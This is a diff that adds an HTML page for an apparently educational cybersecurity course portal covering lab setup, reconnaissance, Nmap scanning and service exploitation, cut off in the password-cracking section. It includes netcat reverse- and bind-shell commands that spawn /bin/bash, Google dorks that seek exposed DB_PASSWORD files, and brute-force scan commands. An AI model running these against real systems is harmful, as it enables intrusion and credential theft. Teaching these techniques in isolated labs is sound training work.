@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Cybersecurity Crash Course - A comprehensive learning portal covering the complete kill chain from reconnaissance to exploitation.">
+    <title>Cybersecurity Crash Course | Home</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Persistent Navigation -->
+    <nav class="nav-container">
+        <div class="nav-inner">
+            <a href="index.html" class="nav-logo">
+                <div class="nav-logo-icon">🔒</div>
+                <span class="nav-logo-text">CyberCourse</span>
+            </a>
+            <button class="nav-toggle" aria-label="Toggle navigation" onclick="toggleNav()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li class="nav-menu-item"><a href="index.html" class="active">Home</a></li>
+                <li class="nav-menu-item"><a href="month1.html">Foundations</a></li>
+                <li class="nav-menu-item"><a href="month2.html">Labs & Scanning</a></li>
+                <li class="nav-menu-item"><a href="month3.html">Enumeration</a></li>
+                <li class="nav-menu-item"><a href="tools.html">Tool Hub</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <main class="main-content">
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="hero-content">
+                <span class="hero-badge">🎓 Cybersecurity Training Portal</span>
+                <h1>Cybersecurity Crash Course</h1>
+                <p>Master the complete attack kill chain—from reconnaissance and scanning to enumeration and exploitation. Hands-on training with industry-standard tools in isolated virtual labs.</p>
+                <div class="hero-buttons">
+                    <button class="btn btn-primary" onclick="switchTab(0)">
+                        Start Learning
+                        <span>→</span>
+                    </button>
+                    <a href="tools.html" class="btn btn-secondary">
+                        Browse Tool Hub
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <!-- 4-Tab Kill Chain Architecture -->
+        <div class="container">
+            <!-- Tab Navigation -->
+            <div class="tab-nav">
+                <button class="tab-btn active" onclick="switchTab(0)">Tab 1: Foundations & Architecture</button>
+                <button class="tab-btn" onclick="switchTab(1)">Tab 2: Reconnaissance & OSINT</button>
+                <button class="tab-btn" onclick="switchTab(2)">Tab 3: Scanning & Enumeration</button>
+                <button class="tab-btn" onclick="switchTab(3)">Tab 4: Exploitation & Access</button>
+            </div>
+
+            <!-- TAB 1: Foundations & Architecture -->
+            <div id="tab-1" class="tab-content active">
+                <div class="section-header">
+                    <span class="section-label">Phase 0</span>
+                    <h2>Foundations & Architecture</h2>
+                    <p>Build your virtual lab environment and master the networking fundamentals required for cybersecurity operations.</p>
+                </div>
+
+                <!-- Virtual Lab Setup -->
+                <section class="tool-category">
+                    <h2>🖥️ Virtual Lab Infrastructure</h2>
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">VirtualBox Hypervisor Setup</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            VirtualBox is a Type-2 hypervisor that creates isolated virtual machines for safe penetration testing practice.
+                        </p>
+                        <div class="tech-spec">
+                            <h4>BIOS/UEFI Prerequisites</h4>
+                            <p>Enable <code>Intel VT-x</code> or <code>AMD-V</code> hardware virtualization extensions. Without these, 64-bit VMs and nested virtualization will fail.</p>
+                        </div>
+                        <h4 style="color: var(--text-primary); margin: 1rem 0 0.5rem;">Installation Sequence:</h4>
+                        <ol style="color: var(--text-secondary); padding-left: 1.5rem; line-height: 2.2;">
+                            <li>Download the platform binary from virtualbox.org</li>
+                            <li>Run the executable with Administrator privileges</li>
+                            <li>Enable Virtualization Support (VT-x/AMD-V) in your hardware BIOS</li>
+                            <li>Complete installation setup</li>
+                        </ol>
+                        <span class="tool-badge">VirtualBox</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">🐱 Kali Linux - Penetration Testing OS</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Kali Linux is a Debian-based distribution with 600+ pre-installed penetration testing tools including Nmap, Wireshark, Metasploit, and Burp Suite.
+                        </p>
+                        <div class="tech-spec">
+                            <h4>VM Resource Allocation</h4>
+                            <p><code>RAM: 2048MB minimum (4096MB recommended)</code> | <code>CPU: 2 Cores minimum</code> | <code>Disk: 25GB dynamically allocated</code></p>
+                        </div>
+                        <h4 style="color: var(--text-primary); margin: 1rem 0 0.5rem;">Import Procedure:</h4>
+                        <ol style="color: var(--text-secondary); padding-left: 1.5rem; line-height: 2.2;">
+                            <li>Download the pre-built 64-bit VirtualBox (.vbox) image</li>
+                            <li>Open VirtualBox → File → Import Appliance</li>
+                            <li>Allocate a minimum of 2048MB RAM and 2 Processor Cores</li>
+                            <li>Select "Copy machine ID"</li>
+                            <li>Click Import</li>
+                        </ol>
+                        <span class="tool-badge">Kali Linux</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">🎯 Metasploitable - Vulnerable Target VM</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Metasploitable is an intentionally vulnerable Linux VM containing exploitable services including vsftpd 2.3.4 backdoor, Tomcat manager, and weak SSH credentials.
+                        </p>
+                        <h4 style="color: var(--text-primary); margin: 1rem 0 0.5rem;">Configuration Steps:</h4>
+                        <ol style="color: var(--text-secondary); padding-left: 1.5rem; line-height: 2.2;">
+                            <li>Extract the downloaded zip file</li>
+                            <li>Open VirtualBox → Click "New"</li>
+                            <li>Name it 'Metasploitable' → Select Linux/Ubuntu 64-bit</li>
+                            <li>Choose "Use an existing virtual hard disk file"</li>
+                            <li>Browse and select the extracted .vmdk file</li>
+                            <li>Click Create</li>
+                        </ol>
+                        <span class="tool-badge">Metasploitable</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">🪟 Windows Target VMs</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Windows 7 and Windows 10 VMs provide targets for SMB enumeration, pass-the-hash attacks, and Windows-specific privilege escalation techniques.
+                        </p>
+                        <span class="tool-badge">Windows 7 VM</span>
+                        <span class="tool-badge">Windows 10 VM</span>
+                    </div>
+                </section>
+
+                <!-- Network Configuration -->
+                <section class="tool-category">
+                    <h2>🔗 Network Architecture & Subnetting</h2>
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h4 style="color: var(--cyan); margin-bottom: 1rem;">NAT Network Configuration</h4>
+                        <div class="code-block">
+<span class="comment"># Step 1: In VirtualBox, go to Settings → Network → Adapter 1</span>
+<span class="comment"># Step 2: Change "Attached to" from default NAT to "NAT Network"</span>
+<span class="comment"># (This builds an isolated internal LAN sub-network allowing the Kali</span>
+<span class="comment"># instance to actively run discovery sweeps against the target Metasploitable interface)</span>
+<span class="comment"># Step 3: Run 'ip a' or 'ifconfig' in both terminals to verify both machines</span>
+<span class="comment"># sit on the same subnet (e.g., 10.0.2.X)</span>
+                        </div>
+                        <div class="tech-spec">
+                            <h4>Subnet Verification Commands</h4>
+                            <p><code>ip a</code> — Display all network interfaces and IP addresses</p>
+                            <p><code>ifconfig</code> — Legacy network interface configuration tool</p>
+                            <p><code>ping 10.0.2.X</code> — Test ICMP connectivity to target</p>
+                        </div>
+                    </div>
+
+                </section>
+
+                <!-- Linux & Networking Utilities -->
+                <section class="tool-category">
+                    <h2>🐧 Essential Linux Utilities</h2>
+                    <div class="table-container">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>Command</th>
+                                    <th>Function</th>
+                                    <th>Example</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><code>pwd</code></td>
+                                    <td>Print Working Directory</td>
+                                    <td><code>pwd → /home/kali</code></td>
+                                </tr>
+                                <tr>
+                                    <td><code>whoami</code></td>
+                                    <td>Display current user</td>
+                                    <td><code>whoami → kali</code></td>
+                                </tr>
+                                <tr>
+                                    <td><code>sudo su</code></td>
+                                    <td>Elevate to root privileges</td>
+                                    <td><code>sudo su → # prompt</code></td>
+                                </tr>
+                                <tr>
+                                    <td><code>ls -la</code></td>
+                                    <td>List files with hidden and details</td>
+                                    <td><code>ls -la /etc</code></td>
+                                </tr>
+                                <tr>
+                                    <td><code>cd</code></td>
+                                    <td>Change Directory</td>
+                                    <td><code>cd /var/www</code></td>
+                                </tr>
+                                <tr>
+                                    <td><code>nano</code></td>
+                                    <td>Text editor</td>
+                                    <td><code>nano /etc/hosts</code></td>
+                                </tr>
+                                <tr>
+                                    <td><code>clear</code></td>
+                                    <td>Clear terminal screen</td>
+                                    <td><code>clear</code></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <span class="tool-badge">nano</span>
+                    <span class="tool-badge">pwd</span>
+                    <span class="tool-badge">whoami</span>
+                    <span class="tool-badge">ls</span>
+                    <span class="tool-badge">cd</span>
+                    <span class="tool-badge">sudo su</span>
+                    <span class="tool-badge">clear</span>
+                </section>
+
+                <section class="tool-category">
+                    <h2>🌐 Networking Utilities</h2>
+                    <div class="table-container">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>Command</th>
+                                    <th>Protocol</th>
+                                    <th>Function</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><code>ip a</code></td>
+                                    <td>N/A</td>
+                                    <td>Display all IP addresses and interfaces</td>
+                                </tr>
+                                <tr>
+                                    <td><code>ifconfig</code></td>
+                                    <td>N/A</td>
+                                    <td>Configure network interfaces (deprecated)</td>
+                                </tr>
+                                <tr>
+                                    <td><code>ping</code></td>
+                                    <td>ICMP Echo Request</td>
+                                    <td>Test host reachability via ICMP</td>
+                                </tr>
+                                <tr>
+                                    <td><code>traceroute</code></td>
+                                    <td>ICMP/UDP</td>
+                                    <td>Trace packet path to destination</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <span class="tool-badge">ifconfig</span>
+                    <span class="tool-badge">ip a</span>
+                    <span class="tool-badge">ping</span>
+                    <span class="tool-badge">ICMP Utilities</span>
+                </section>
+            </div>
+
+            <!-- TAB 2: Phase 1 - Reconnaissance & OSINT -->
+            <div id="tab-2" class="tab-content">
+                <div class="section-header">
+                    <span class="section-label">Phase 1</span>
+                    <h2>Reconnaissance & OSINT</h2>
+                    <p>Passive and active intelligence gathering techniques to map the target's digital footprint before engagement.</p>
+                </div>
+
+                <!-- Passive Reconnaissance -->
+                <section class="tool-category">
+                    <h2>👁️ Passive Reconnaissance (No Direct Contact)</h2>
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">WHOIS Protocol</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            WHOIS queries the regional Internet registry (RIR) databases to retrieve domain registration information including registrant name, email, phone, nameservers, and registration/expiry dates.
+                        </p>
+                        <div class="code-block">
+<span class="command">whois example.com</span>
+<span class="comment"># Returns: Registrar, Creation Date, Expiry Date, Nameservers, Registrant Contact</span>
+                        </div>
+                        <span class="tool-badge">WHOIS</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">DNS Enumeration - nslookup</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            nslookup queries DNS servers to resolve hostnames to IP addresses and discover mail servers (MX records), nameservers (NS records), and other DNS resource records.
+                        </p>
+                        <div class="code-block">
+<span class="command">nslookup -type=mx example.com</span>
+<span class="comment"># Returns mail exchange servers</span>
+<span class="command">nslookup -type=ns example.com</span>
+<span class="comment"># Returns authoritative nameservers</span>
+<span class="command">nslookup -type=any example.com</span>
+<span class="comment"># Returns all available DNS records</span>
+                        </div>
+                        <span class="tool-badge">nslookup</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">Reverse IP Lookup</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Reverse IP lookup identifies all domains hosted on a specific IP address, revealing shared hosting environments and potentially related targets.
+                        </p>
+                        <span class="tool-badge">Reverse IP Lookup</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">Wappalyzer - Technology Fingerprinting</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Wappalyzer is a browser extension that identifies the technology stack of websites including CMS (WordPress, Drupal), web servers (Apache, Nginx), analytics tools, JavaScript frameworks, and programming languages.
+                        </p>
+                        <span class="tool-badge">Wappalyzer</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">Wayback Machine - Historical Analysis</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            The Wayback Machine (archive.org) stores historical snapshots of websites. Useful for finding deleted pages, old credentials, exposed directories, and changed content that may reveal vulnerabilities.
+                        </p>
+                        <span class="tool-badge">Wayback Machine</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">HTTrack - Website Cloning</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            HTTrack downloads entire websites for offline browsing and analysis. Creates a local mirror including HTML, images, and linked resources for thorough examination without generating additional traffic.
+                        </p>
+                        <div class="code-block">
+<span class="command">httrack https://target.com -O /tmp/mirror</span>
+<span class="comment"># Creates complete offline mirror of target website</span>
+                        </div>
+                        <span class="tool-badge">HTTrack</span>
+                    </div>
+                </section>
+
+                <!-- Active Reconnaissance -->
+                <section class="tool-category">
+                    <h2>🔍 Active Reconnaissance (Direct Interaction)</h2>
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">GHDB - Google Hacking Database</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            GHDB is a repository of advanced Google dorks (search queries) designed to find vulnerable systems, exposed documents, login pages, and sensitive information indexed by Google.
+                        </p>
+                        <div class="code-block">
+<span class="comment"># Common GHDB Dorks:</span>
+site:target.com ext:php inurl:id=     <span class="command"># SQL injection targets</span>
+site:target.com intitle:"index of"     <span class="command"># Directory listing exposure</span>
+site:target.com ext:log                <span class="command"># Exposed log files</span>
+site:target.com inurl:admin            <span class="command"># Admin panel discovery</span>
+filetype:env "DB_PASSWORD"             <span class="command"># Exposed environment files</span>
+                        </div>
+                        <span class="tool-badge">GHDB</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">CVE - Common Vulnerabilities and Exposures</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            CVE is a standardized dictionary of publicly known cybersecurity vulnerabilities. Each CVE entry has a unique ID (e.g., CVE-2021-44228 for Log4Shell) and is assigned a CVSS severity score.
+                        </p>
+                        <span class="tool-badge">CVE</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">Exploit-DB</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Exploit-DB is a repository of public exploits and vulnerable software. Maintained by OffSec, it contains shellcode, papers, and proof-of-concept exploits searchable by CVE, platform, or application.
+                        </p>
+                        <span class="tool-badge">Exploit-DB</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">Maltego - Link Analysis & Visualization</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Maltego is a powerful OSINT tool that visualizes relationships between entities (domains, IPs, emails, social media accounts, people). Uses "transforms" to query data sources and build interactive graphs showing the attack surface.
+                        </p>
+                        <span class="tool-badge">Maltego</span>
+                    </div>
+                </section>
+            </div>
+
+            <!-- TAB 3: Phase 2 - Scanning & Enumeration -->
+            <div id="tab-3" class="tab-content">
+                <div class="section-header">
+                    <span class="section-label">Phase 2</span>
+                    <h2>Scanning & Enumeration</h2>
+                    <p>Active network discovery, port scanning, service identification, and deep enumeration of target systems.</p>
+                </div>
+
+                <!-- Host Discovery -->
+                <section class="tool-category">
+                    <h2>📡 Host Discovery Tools</h2>
+                    <div class="content-grid">
+                        <div class="glass-card content-card">
+                            <h3>Ping - ICMP Host Discovery</h3>
+                            <p>Sends ICMP Echo Request packets to determine if a host is reachable. Firewalls often block ICMP, making this unreliable for stealth operations.</p>
+                            <div class="code-block">
+<span class="command">ping -c 4 10.0.2.5</span>
+                            </div>
+                            <span class="tool-badge">Ping</span>
+                        </div>
+                        <div class="glass-card content-card">
+                            <h3>Netdiscover - ARP Scanning</h3>
+                            <p>Discovers live hosts on local networks using ARP requests. More reliable than ICMP for LAN discovery since ARP cannot be blocked on the local segment.</p>
+                            <div class="code-block">
+<span class="command">netdiscover -r 10.0.2.0/24</span>
+                            </div>
+                            <span class="tool-badge">Netdiscover</span>
+                        </div>
+                        <div class="glass-card content-card">
+                            <h3>Angry IP Scanner</h3>
+                            <p>Fast, cross-platform IP scanner that uses ICMP, TCP, and UDP probes. Provides GUI-based network mapping with export capabilities.</p>
+                            <span class="tool-badge">Angry IP Scanner</span>
+                        </div>
+                        <div class="glass-card content-card">
+                            <h3>Advanced IP Scanner</h3>
+                            <p>Windows-native network scanner with RDP and SSH integration. Scans IP ranges and provides one-click remote access to discovered hosts.</p>
+                            <span class="tool-badge">Advanced IP Scanner</span>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Nmap Deep Dive -->
+                <section class="tool-category">
+                    <h2>🔍 Nmap - Network Mapper</h2>
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">TCP SYN Half-Open Scanning</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            TCP SYN scan (<code>-sS</code>) sends a SYN packet and analyzes the response without completing the TCP three-way handshake. SYN-ACK indicates open port; RST indicates closed. This technique is stealthy as the connection is never fully established.
+                        </p>
+                        <div class="code-block">
+<span class="command">nmap -sS 10.0.2.5</span>
+<span class="comment"># SYN scan - half-open, stealthy</span>
+                        </div>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">OS Fingerprinting via TTL Analysis</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Nmap identifies operating systems by analyzing TCP/IP stack behaviors including TTL (Time To Live) values, TCP window sizes, and IP ID sequences. Linux typically uses TTL 64; Windows uses TTL 128.
+                        </p>
+                        <div class="code-block">
+<span class="command">nmap -O 10.0.2.5</span>
+<span class="comment"># OS detection via TCP/IP fingerprinting</span>
+<span class="command">nmap -O --osscan-guess 10.0.2.5</span>
+<span class="command"># Aggressive OS guessing</span>
+                        </div>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">Complete Nmap Command Reference</h3>
+                        <div class="table-container">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>Flag</th>
+                                        <th>Function</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><code>-sS</code></td>
+                                        <td>TCP SYN (Stealth) Scan</td>
+                                    </tr>
+                                    <tr>
+                                        <td><code>-sT</code></td>
+                                        <td>TCP Connect Scan (Full handshake)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><code>-sU</code></td>
+                                        <td>UDP Scan</td>
+                                    </tr>
+                                    <tr>
+                                        <td><code>-sV</code></td>
+                                        <td>Service Version Detection</td>
+                                    </tr>
+                                    <tr>
+                                        <td><code>-O</code></td>
+                                        <td>OS Detection</td>
+                                    </tr>
+                                    <tr>
+                                        <td><code>-p-</code></td>
+                                        <td>Scan all 65535 ports</td>
+                                    </tr>
+                                    <tr>
+                                        <td><code>-F</code></td>
+                                        <td>Fast scan (top 100 ports)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><code>-A</code></td>
+                                        <td>Aggressive (OS + Version + Script + Traceroute)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><code>-sC</code></td>
+                                        <td>Default NSE scripts</td>
+                                    </tr>
+                                    <tr>
+                                        <td><code>-T4</code></td>
+                                        <td>Timing template (0=paranoid, 5=insane)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <span class="tool-badge">Nmap</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">Nmap NSE Script Categories</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Nmap Scripting Engine (NSE) extends Nmap with Lua scripts for advanced discovery, vulnerability detection, and exploitation. Scripts are categorized by purpose and risk level.
+                        </p>
+                        <div class="content-grid">
+                            <div class="content-card" style="background: rgba(0,0,0,0.2);">
+                                <h4>🔐 auth</h4>
+                                <p>Bypass authentication and extract credentials from services.</p>
+                            </div>
+                            <div class="content-card" style="background: rgba(0,0,0,0.2);">
+                                <h4>💥 brute</h4>
+                                <p>Brute force authentication on various services (SSH, FTP, HTTP).</p>
+                            </div>
+                            <div class="content-card" style="background: rgba(0,0,0,0.2);">
+                                <h4>🔎 discovery</h4>
+                                <p>Network discovery and topology mapping scripts.</p>
+                            </div>
+                            <div class="content-card" style="background: rgba(0,0,0,0.2);">
+                                <h4>⚠️ vuln</h4>
+                                <p>Vulnerability detection scripts (CVE checks, misconfigurations).</p>
+                            </div>
+                            <div class="content-card" style="background: rgba(0,0,0,0.2);">
+                                <h4>✅ safe</h4>
+                                <p>Non-intrusive scripts that won't crash services.</p>
+                            </div>
+                            <div class="content-card" style="background: rgba(0,0,0,0.2);">
+                                <h4>☢️ intrusive</h4>
+                                <p>Scripts that may crash services or generate significant traffic.</p>
+                            </div>
+                            <div class="content-card" style="background: rgba(0,0,0,0.2);">
+                                <h4>🔓 exploit</h4>
+                                <p>Active exploitation scripts for known vulnerabilities.</p>
+                            </div>
+                            <div class="content-card" style="background: rgba(0,0,0,0.2);">
+                                <h4>🦠 malware</h4>
+                                <p>Detect backdoors and malware infections on target systems.</p>
+                            </div>
+                        </div>
+                        <div class="code-block" style="margin-top: 1rem;">
+<span class="command">nmap -sC -sV 10.0.2.5</span>
+<span class="comment"># Default scripts + version detection</span>
+<span class="command">nmap --script vuln 10.0.2.5</span>
+<span class="comment"># Run all vulnerability detection scripts</span>
+<span class="command">nmap --script brute 10.0.2.5</span>
+<span class="command"># Run brute force scripts</span>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Zenmap -->
+                <section class="tool-category">
+                    <h2>🖥️ Zenmap - Nmap GUI</h2>
+                    <div class="glass-card" style="padding: 2rem;">
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Zenmap is the official graphical user interface for Nmap. It provides topology visualization showing how hosts are interconnected, pre-configured scan profiles for common scenarios, and interactive result exploration with filtering and comparison capabilities.
+                        </p>
+                        <span class="tool-badge">Zenmap</span>
+                    </div>
+                </section>
+
+                <!-- SSL/TLS Enumeration -->
+                <section class="tool-category">
+                    <h2>🔒 SSL/TLS Enumeration</h2>
+                    <div class="glass-card" style="padding: 2rem;">
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            SSL/TLS enumeration scripts identify certificate details, supported cipher suites, protocol versions, and vulnerabilities like Heartbleed, POODLE, and weak ciphers.
+                        </p>
+                        <div class="code-block">
+<span class="command">nmap --script ssl-enum-ciphers -p 443 target.com</span>
+<span class="comment"># Enumerate SSL cipher suites</span>
+<span class="command">nmap --script ssl-heartbleed -p 443 target.com</span>
+<span class="command"># Check for Heartbleed vulnerability</span>
+                        </div>
+                        <span class="tool-badge">SSL/TLS Enumeration Scripts</span>
+                    </div>
+                </section>
+            </div>
+
+            <!-- TAB 4: Phase 3 - Exploitation & Access -->
+            <div id="tab-4" class="tab-content">
+                <div class="section-header">
+                    <span class="section-label">Phase 3</span>
+                    <h2>Exploitation & Access</h2>
+                    <p>Service interaction, credential attacks, and post-exploitation techniques for gaining and maintaining access.</p>
+                </div>
+
+                <!-- Protocol Exploitation -->
+                <section class="tool-category">
+                    <h2>🌐 Service Protocol Exploitation</h2>
+                    <div class="content-grid">
+                        <div class="glass-card content-card">
+                            <h3>FTP (Port 20/21)</h3>
+                            <p>File Transfer Protocol often configured with anonymous login enabled. Vulnerable to bounce attacks and credential sniffing.</p>
+                            <div class="code-block">
+<span class="command">ftp 10.0.2.5</span>
+<span class="command">anonymous</span>  <span class="comment"># Try anonymous login</span>
+                            </div>
+                            <span class="tool-badge">FTP</span>
+                        </div>
+                        <div class="glass-card content-card">
+                            <h3>SSH (Port 22)</h3>
+                            <p>Secure Shell for encrypted remote access. Target for brute force attacks and key-based authentication exploits.</p>
+                            <div class="code-block">
+<span class="command">ssh user@10.0.2.5</span>
+<span class="command">ssh -i key.pem user@10.0.2.5</span>
+                            </div>
+                            <span class="tool-badge">SSH</span>
+                        </div>
+                        <div class="glass-card content-card">
+                            <h3>Telnet (Port 23)</h3>
+                            <p>Insecure plaintext remote login protocol. All communications including passwords transmitted unencrypted.</p>
+                            <div class="code-block">
+<span class="command">telnet 10.0.2.5 23</span>
+                            </div>
+                            <span class="tool-badge">Telnet</span>
+                        </div>
+                        <div class="glass-card content-card">
+                            <h3>MySQL (Port 3306)</h3>
+                            <p>Database service vulnerable to brute force, SQL injection via applications, and misconfigured root access.</p>
+                            <div class="code-block">
+<span class="command">mysql -h 10.0.2.5 -u root -p</span>
+                            </div>
+                            <span class="tool-badge">MySQL</span>
+                        </div>
+                        <div class="glass-card content-card">
+                            <h3>SNMP (Port 161/162)</h3>
+                            <p>Simple Network Management Protocol with default community strings (public/private) exposes system information.</p>
+                            <div class="code-block">
+<span class="command">snmpwalk -c public -v1 10.0.2.5</span>
+                            </div>
+                            <span class="tool-badge">SNMP</span>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Netcat -->
+                <section class="tool-category">
+                    <h2>🐱 Netcat - The Network Swiss Army Knife</h2>
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <p style="color: var(--text-secondary); margin-bottom: 1.5rem;">
+                            Netcat reads and writes data across network connections using TCP or UDP. It's used for banner grabbing, file transfer, port scanning, and establishing reverse/bind shells.
+                        </p>
+                        <h4 style="color: var(--cyan); margin-bottom: 1rem;">Banner Grabbing</h4>
+                        <div class="code-block">
+<span class="command">nc -nv 10.0.2.5 80</span>
+<span class="command">GET / HTTP/1.1</span>
+<span class="command">Host: 10.0.2.5</span>
+<span class="comment"># Returns server banner and HTTP response</span>
+                        </div>
+                        <h4 style="color: var(--cyan); margin-bottom: 1rem;">Reverse Shell (Attacker → Victim)</h4>
+                        <div class="code-block">
+<span class="comment"># On attacker machine (listener):</span>
+<span class="command">nc -lvnp 4444</span>
+<span class="comment"># On victim machine (callback):</span>
+<span class="command">nc -e /bin/bash 10.0.2.4 4444</span>
+                        </div>
+                        <h4 style="color: var(--cyan); margin-bottom: 1rem;">Bind Shell (Victim → Attacker)</h4>
+                        <div class="code-block">
+<span class="comment"># On victim machine (listener):</span>
+<span class="command">nc -lvnp 4444 -e /bin/bash</span>
+<span class="comment"># On attacker machine (connect):</span>
+<span class="command">nc 10.0.2.5 4444</span>
+                        </div>
+                        <span class="tool-badge">Netcat (nc)</span>
+                    </div>
+                </section>
+
+                <!-- Password Cracking -->
+                <section class="tool-category">
+                    <h2>🔓 Password Cracking & Hash Analysis</h2>
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">LM Hash - Cryptographic Deficiencies</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            LM (LAN Manager) hash is a legacy Windows password storage mechanism with critical weaknesses: passwords are converted to uppercase, split into two 7-character halves, and each half is encrypted with DES. This makes LM hashes trivially crackable.
+                        </p>
+                        <div class="tech-spec">
+                            <h4>LM Hash Weaknesses</h4>
+                            <p>• Passwords > 14 characters split into two 7-char halves</p>
+                            <p>• All lowercase converted to uppercase (reduced keyspace)</p>
+                            <p>• DES encryption with no salt</p>
+                            <p>• Each half cracked independently</p>
+                        </div>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">NTLM Hash - Improvements & Remaining Weaknesses</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            NTLM (NT LAN Manager) uses MD4 hashing instead of DES and doesn't split passwords. However, it lacks salt, making identical passwords produce identical hashes—enabling rainbow table attacks and pass-the-hash exploitation.
+                        </p>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem; margin-bottom: 1.5rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">Ophcrack - Windows Password Recovery</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Ophcrack is a Windows password cracking tool that uses rainbow tables for rapid LM and NTLM hash recovery. It boots from CD/USB and can crack most passwords in minutes.
+                        </p>
